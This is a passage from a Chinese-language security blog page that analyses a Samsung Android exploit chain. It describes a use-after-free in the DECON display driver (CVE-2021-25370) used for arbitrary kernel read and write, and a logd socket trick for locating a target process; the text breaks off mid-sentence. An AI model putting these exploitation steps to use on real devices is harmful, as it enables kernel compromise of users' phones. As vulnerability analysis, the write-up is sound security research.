+<li>2020年4月，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/arm64/kernel/traps.c?h=linux-4.14.y&id=6dc0256f802be6bc783fb9542affb48d267f592c">上游Linux进行了一项更改</a>，不再在内核回溯中包含原始堆栈内容。</li>
+</ul>
+<h1 id="漏洞-3-任意内核读写">漏洞 #3 - 任意内核读写</h1><p>利用链中的最后一个漏洞（CVE-2021-25370）是显示处理单元（DPU）的显示和增强控制器（DECON）三星驱动程序中的文件结构体释放后使用（use-after-free）。根据<a href="https://patchwork.kernel.org/project/dri-devel/patch/1417097460-18403-1-git-send-email-ajaykumar.rs@samsung.com/">上游提交消息</a>，DECON负责从像素数据创建视频信号。此漏洞用于获取任意内核读写访问权限。</p>
+<p><img src="/images/9ee10ec51dce/078397e92700128591b13fb188121a31.png" alt="三星2021年3月安全更新中CVE-2021-25370条目的截图。内容为："SVE-2021-19925 (CVE-2021-25370): dpu驱动程序中的内存损坏 严重性：中等 受影响版本：搭载选定Exynos芯片组的O(8.x)、P(9.0)、Q(10.0)、R(11.0)设备 报告日期：2020年12月12日 披露状态：私下披露。SMR Mar-2021 Release 1之前的dpu驱动程序中处理文件描述符的错误实现导致内存损坏，进而导致内核恐慌。补丁修复了dpu驱动程序中的错误实现，以解决内存损坏问题。"" loading="lazy"></p>
+<h2 id="查找android-hardware-graphics-composer的pid">查找android.hardware.graphics.composer的PID</h2><p>为了能够触发漏洞，利用程序需要驱动程序的fd以发送ioctl调用。为了找到fd，利用程序必须遍历目标进程的fd proc目录。因此，利用程序首先需要找到图形进程的PID。</p>
+<p>利用程序连接到<a href="https://cs.android.com/android/platform/superproject/+/586af4e17de6b8bf665dc2a1bb61f46fddb326f7:system/logging/logd/main.cpp;l=256">在<code>/dev/socket/logdr</code>监听的<code>LogReader</code></a>。当客户端连接到<code>LogReader</code>时，<code>LogReader</code>将日志内容写回客户端。然后，利用程序通过套接字写回<code>LogReader</code>来配置它发送主日志缓冲区（0）、系统日志缓冲区（3）和崩溃日志缓冲区（4）的日志：</p>
+<pre><code>stream lids=0,3,4
+</code></pre>
+<p>然后，利用程序监视日志内容，直到看到单词&quot;display&quot;或&quot;SDM&quot;。一旦找到&quot;display&quot;或&quot;SDM&quot;日志条目，利用程序就从该日志条目中读取PID。</p>
+<p>现在它有了<code>android.hardware.graphics.composer</code>的PID，其中[`android.h</p>
+
+        </div>
+        
+  <div class="post-tags">
+    <span>标签:</span>
+    <a href="/tag/安全漏洞.html" class="tag-link">#安全漏洞</a> <a href="/tag/Linux安全.html" class="tag-link">#Linux安全</a> <a href="/tag/Java安全.html" class="tag-link">#Java安全</a> <a href="/tag/固件安全.html" class="tag-link">#固件安全</a> <a href="/tag/WiFi安全.html" class="tag-link">#WiFi安全</a> <a href="/tag/GPU安全.html" class="tag-link">#GPU安全</a> <a href="/tag/浏览器安全.html" class="tag-link">#浏览器安全</a> <a href="/tag/UAF.html" class="tag-link">#UAF</a>
+  </div>
+  
+        
+  <div class="adsense adsense-bottom">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-1206611804757181"
+         data-ad-slot="4232191576"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+  </div>
+  
+      </article>
+      
+    <nav class="post-toc">
+      <div class="toc-title">目录</div>
+      <ul class="toc-list">
+        
+          <li class="toc-item toc-level-0">
+            <a href="#利用样本" class="toc-link">
+              <span class="toc-text">利用样本</span>
+              
+            </a>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0 has-children">
+            <a href="#漏洞-1-任意文件系统读写" class="toc-link">
+              <span class="toc-text">漏洞 #1 - 任意文件系统读写</span>
+              
+                <button class="toc-fold-btn" onclick="toggleTocSection(this)" title="折叠/展开">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                  </svg>
+                </button>
+              
+            </a>
+            
+              <ul class="toc-sublist">
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#关于android内容提供程序" class="toc-link">关于Android内容提供程序</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#漏洞详情" class="toc-link">漏洞详情</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#漏洞修复" class="toc-link">漏洞修复</a>
+                  </li>
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#执行阶段2-elf" class="toc-link">执行阶段2 ELF</a>
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0 has-children">
+            <a href="#漏洞-2-task-struct和sys-call-table地址泄露" class="toc-link">
+              <span class="toc-text">漏洞 #2 - task_struct和sys_call_table地址泄露</span>
+              
+                <button class="toc-fold-btn" onclick="toggleTocSection(this)" title="折叠/展开">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                  </svg>
+                </button>
+              
+            </a>
+            
+              <ul class="toc-sublist">
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#漏洞修复" class="toc-link">漏洞修复</a>
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li class="toc-item toc-level-0 has-children">
+            <a href="#漏洞-3-任意内核读写" class="toc-link">
+              <span class="toc-text">漏洞 #3 - 任意内核读写</span>
+              
+                <button class="toc-fold-btn" onclick="toggleTocSection(this)" title="折叠/展开">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                  </svg>
+                </button>
+              
+            </a>
+            
+              <ul class="toc-sublist">
+                
+                  <li class="toc-item toc-level-1">
+                    <a href="#查找android-hardware-graphics-composer的pid" class="toc-link">查找android.hardware.graphics.composer的PID</a>
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+      </ul>
+    </nav>
+    
+    </div>
+  </main>
+  
+  <div class="adsense adsense-floating adsense-floating-left">
+    <ins class="adsbygoogle"
+         style="display:block; width:160px; height:600px"
+         data-ad-client="ca-pub-1206611804757181"
+         data-ad-slot="4232191576"
+         data-ad-format="vertical"
+         data-full-width-responsive="false"></ins>
+    <script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+  </div>
+  
+  
+  
+  <footer class="site-footer">
+    <div class="footer-container">
+      <div class="footer-content">
+        <p>&copy; 2026 BasicBit. All rights reserved.</p>
+        <p>安全逆向技术文章博客</p>
+      </div>
+    </div>
+  </footer>
+  <script>document.addEventListener('DOMContentLoaded',function(){const menuToggle=document.querySelector('.mobile-menu-btn');const siteNav=document.querySelector('.site-nav');if(menuToggle&&siteNav){menuToggle.addEventListener('click',function(){const isExpanded=this.getAttribute('aria-expanded')==='true';this.setAttribute('aria-expanded',!isExpanded);siteNav.classList.toggle('active');});}const mobileSearchBtn=document.querySelector('.mobile-search-btn');const mobileSearchModal=document.querySelector('.mobile-search-modal');const mobileSearchClose=document.querySelector('.mobile-search-close');const mobileSearchInput=document.querySelector('.mobile-search-input');if(mobileSearchBtn&&mobileSearchModal){mobileSearchBtn.addEventListener('click',function(){mobileSearchModal.classList.add('active');mobileSearchBtn.setAttribute('aria-expanded','true');if(mobileSearchInput){setTimeout(()=>mobileSearchInput.focus(),100);}});if(mobileSearchClose){mobileSearchClose.addEventListener('click',function(){mobileSearchModal.classList.remove('active');mobileSearchBtn.setAttribute('aria-expanded','false');});}mobileSearchModal.addEventListener('click',function(e){if(e.target===mobileSearchModal){mobileSearchModal.classList.remove('active');mobileSearchBtn.setAttribute('aria-expanded','false');}});document.addEventListener('keydown',function(e){if(e.key==='Escape'&&mobileSearchModal.classList.contains('active')){mobileSearchModal.classList.remove('active');mobileSearchBtn.setAttribute('aria-expanded','false');}});}document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener('click',function(e){const href=this.getAttribute('href');if(href !=='#'){e.preventDefault();const target=document.querySelector(href);if(target){target.scrollIntoView({behavior:'smooth'});}}});});const searchInput=document.querySelector('.search-input');if(searchInput){searchInput.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();const query=this.value.trim();if(query){window.location.href='/search?q='+encodeURIComponent(query);}else{alert('请输入搜索关键词');}}});const searchBtn=document.querySelector('.search-btn');if(searchBtn){searchBtn.addEventListener('click',function(e){e.preventDefault();const query=searchInput.value.trim();if(query){window.location.href='/search?q='+encodeURIComponent(query);}else{alert('请输入搜索关键词');}});}}initSearchOnPage();initCodeHighlighting();});function initSearchOnPage(){const searchResults=document.getElementById('search-results');if(!searchResults)return;const params=new URLSearchParams(window.location.search);const query=params.get('q');if(query){searchResults.innerHTML='<div class="loading">搜索中...</div>';performSearch(query,searchResults);}else{searchResults.innerHTML='<div class="no-results">请在顶部搜索框输入关键词搜索文章</div>';}}function performSearch(query,container){if(!container){container=document.getElementById('search-results');}fetch('/search.json').then(response=>response.json()).then(data=>{const results=data.filter(item=>{const searchText=(item.title+''+item.excerpt+''+item.tags.join('')).toLowerCase();return searchText.includes(query.toLowerCase());});displaySearchResults(results,container);}).catch(err=>{console.log('Search error:',err);container.innerHTML='<div class="no-results">搜索加载失败，请刷新页面重试</div>';});}function displaySearchResults(results,container){if(!container){container=document.getElementById('search-results');}if(!container)return;if(results.length===0){container.innerHTML='<div class="no-results">没有找到相关文章</div>';return;}container.innerHTML=results.map(result=>`<article class="post-card fade-in"><h2 class="post-title"><a href="${result.url}">${result.title}</a></h2><div class="post-excerpt"><p>${result.excerpt ||''}</p></div><a href="${result.url}" class="read-more">阅读全文<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg></a></article>`).join('');}function handleSearchClick(btn){const searchInput=document.querySelector('.search-input');if(searchInput){const query=searchInput.value.trim();if(query){window.location.href='/search?q='+encodeURIComponent(query);}else{alert('请输入搜索关键词');}}}function initCodeHighlighting(){}function getUrlParams(){const params=new URLSearchParams(window.location.search);const urlParams={};for(const[key,value]of params){urlParams[key]=value;}return urlParams;}</script>
+  
+    <script>
+      function toggleTocSection(btn) {
+        btn.classList.toggle('collapsed');
+        const sublist = btn.closest('.toc-item').querySelector('.toc-sublist');
+        if (sublist) {
+          sublist.classList.toggle('collapsed');
+        }
+      }
+    </script>
+  
+</body>
+</html>
